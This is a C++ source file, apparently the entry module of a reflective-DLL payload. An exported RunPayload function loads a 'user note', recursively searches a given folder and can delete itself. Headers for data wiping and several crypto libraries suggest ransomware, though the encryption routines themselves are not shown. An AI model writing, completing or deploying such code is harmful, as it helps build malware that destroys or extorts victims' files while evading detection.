// dllmain.cpp (Reflective DLL version)

#include <windows.h>
#include <string>
#include "config.h"
#include "Base64.h"
#include "data_wipe.h"
#include "io_control.h"
// #include "misc.h"
// #include "ntru_crypto.h"
// #include "crypto_functions.h"
// #include "fast_crypt.h"

// Export macro for all compilers
#ifdef BUILD_DLL
#define DLL_EXPORT extern "C" __declspec(dllexport)
#else
#define DLL_EXPORT extern "C" __declspec(dllimport)
#endif

std::wstring wNoteString;

// Forward declarations
void getUserNote(std::wstring& note);
void SearchFolder(const std::wstring& folderPath);
void SelfDelete2();

// Reflective DLLs require a custom entry point, not DllMain.
// This function will be called by your reflective loader.
DLL_EXPORT void RunPayload(const wchar_t* folderPath)
{
    HRESULT hr = CoInitialize(NULL);
    if (FAILED(hr)) {
        return;
    }
    SetErrorMode(SEM_FAILCRITICALERRORS);

    getUserNote(wNoteString);

    if (folderPath && *folderPath) {
        std::wstring wpath(folderPath);
        SearchFolder(wpath);
    }

    // Optionally, delete self after execution:
    // SelfDelete2();

    CoUninitialize();
}

// Optionally, export additional functions as needed
// DLL_EXPORT void SomeOtherFunction(...);

// Optionally, implement a ReflectiveLoader here or link with an existing one
// extern "C" __declspec(dllexport) void* ReflectiveLoader();
